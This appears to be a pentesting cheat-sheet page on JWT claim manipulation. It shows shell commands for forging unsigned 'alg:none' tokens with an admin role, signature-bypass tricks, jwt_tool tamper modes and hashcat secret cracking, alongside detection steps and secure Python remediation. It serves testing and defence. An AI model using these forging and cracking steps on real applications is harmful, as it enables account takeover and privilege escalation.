# JWT Claim Manipulation

## Attack Description

JWT claim manipulation occurs when applications fail to properly protect JWT tokens from modification, allowing attackers to alter claims within the token payload to escalate privileges, access other users' accounts, or bypass security controls.

Common scenarios:
- **Plaintext credentials in JWT payload** - Sensitive data like passwords stored in cleartext within the token
- **URL-based JWT transmission** - Tokens exposed in URLs where they can leak through logs, referrers, or browser history
- **Weak signature validation** - Applications that don't properly verify JWT signatures or accept unsigned tokens

## Prerequisites

- Valid JWT token from the target application
- Ability to decode/inspect JWT structure (jwt.io, base64 decode)
- Understanding of application's authentication flow
- Access to leaked tokens (optional but often found)

## Exploitation Steps

### 1. Token Discovery & Analysis
```bash
# Decode JWT components
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Result: {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "eyJlbWFpbCI6Im1lQGV4YW1wbGUuY29tIiwicGFzc3dvcmQiOiJteXBsYWludGV4dHBhc3N3b3JkIn0" | base64 -d
# Result: {"email":"me@example.com","password":"myplaintextpassword"}
```

### 2. Claim Modification
- **Privilege escalation**: Change `role: "user"` to `role: "admin"`
- **Account takeover**: Change `user_id: 123` to `user_id: 1` (admin account)
- **Email/username modification**: Change identifying fields to target other users
- **Password extraction**: If passwords are in plaintext, extract from decoded payload

### 3. Token Reconstruction
```bash
# Create new header (if changing algorithm)
echo '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '='

# Create new payload
echo '{"email":"victim@example.com","password":"extractedpassword","role":"admin"}' | base64 -w 0 | tr '+/' '-_' | tr -d '='

# Combine: header.payload.signature (empty for 'none' algorithm)
```

### 4. Validation Bypass Techniques
- **Remove signature**: Set algorithm to "none" and remove signature portion
- **Empty signature**: Keep algorithm but provide empty signature
- **Original signature**: If app doesn't verify, keep original signature even after payload modification

## Detection Methods

### Manual Testing
```bash
# Check for JWT tokens in various locations
# Authorization headers: Bearer <token>
# Cookies: session=<token>
# URL parameters: ?token=<token>
# Local storage (browser dev tools)

# Test signature validation
# 1. Modify payload without changing signature
# 2. Remove signature entirely  
# 3. Change algorithm to "none"
# 4. Use empty signature

# Look for sensitive data in payload
jwt.io # Paste token to decode
```

### Automated Scanning
```bash
# JWT_tool - comprehensive JWT testing
python3 jwt_tool.py <JWT_TOKEN> -M at    # All tests
python3 jwt_tool.py <JWT_TOKEN> -T       # Tamper mode
python3 jwt_tool.py <JWT_TOKEN> -X a     # Algorithm confusion

# Check for common vulnerabilities
python3 jwt_tool.py <JWT_TOKEN> -cv      # Common vulnerabilities
```

### Burp Suite Extensions
- **JWT Editor** - Decode, modify, and resign tokens
- **JSON Web Tokens** - Automated JWT testing
- **Burp JWT Extension** - JWT manipulation utilities

## Remediation

### Secure Implementation
```python
# Python - Secure JWT handling
import jwt
import secrets

# Generate strong secret (64+ characters)
JWT_SECRET = secrets.token_urlsafe(64)

# Secure token creation
def create_token(user_data):
    # Never include sensitive data like passwords
    payload = {
        'user_id': user_data['id'],
        'username': user_data['username'],
        'role': user_data['role'],
        'exp': datetime.utcnow() + timedelta(minutes=15),
        'iat': datetime.utcnow()
    }
    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')

# Secure token verification
def verify_token(token):
    try:
        # Always verify signature and algorithm
        payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
        return payload
    except jwt.InvalidTokenError:
        return None
```

### Security Controls
1. **Never store sensitive data in JWTs**
   - No passwords, API keys, or PII
   - Use opaque session identifiers instead

2. **Secure transmission**
   - Never put JWTs in URLs
   - Use secure HTTP-only cookies or Authorization headers
   - Implement HTTPS everywhere

3. **Strong signature verification**
   - Always verify signatures
   - Explicitly specify allowed algorithms
   - Use strong, random secrets (64+ characters)

4. **Implement proper expiration**
   - Short token lifespans (15-30 minutes)
   - Refresh token rotation
   - Token revocation mechanisms

## Real Examples

### Example 1: InfoSec Writeup - Plaintext Password ATO
- **Target**: JWT tokens in email confirmation URLs
- **Vulnerability**: Plaintext email/password in JWT payload
- **Impact**: Full account takeover via URL sharing/logging
- **Payload**: `{"email":"victim@example.com","password":"plaintextpass"}`
- **Exploitation**: Decoded leaked JWT tokens from logs/referrers
- **Bounty**: Marked duplicate (originally reported 2023, unfixed until 2025)

### Example 2: Admin Privilege Escalation
- **Target**: Role-based access control via JWT
- **Vulnerability**: No signature verification on role claims
- **Payload modification**: `{"user":"attacker","role":"user"}` → `{"user":"attacker","role":"admin"}`
- **Impact**: Administrative access to all application functions

### Example 3: Cross-Account Access
- **Target**: User ID in JWT claims
- **Vulnerability**: Modifiable user_id without signature check
- **Payload modification**: `{"user_id":1337}` → `{"user_id":1}` (admin account)
- **Impact**: Access to any user account by ID manipulation

## Tool References

```bash
# JWT_tool (comprehensive)
git clone https://github.com/ticarpi/jwt_tool.git
python3 jwt_tool.py

# Online decoder
# https://jwt.io - Manual decode/encode

# Hashcat for secret cracking
hashcat -m 16500 jwt.hash wordlist.txt

# Custom Python scripts
import jwt
import base64
import json
```

## OWASP References
- **OWASP Top 10 2021**: A02 Cryptographic Failures
- **OWASP ASVS**: V3 Session Management
- **OWASP JWT Security Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html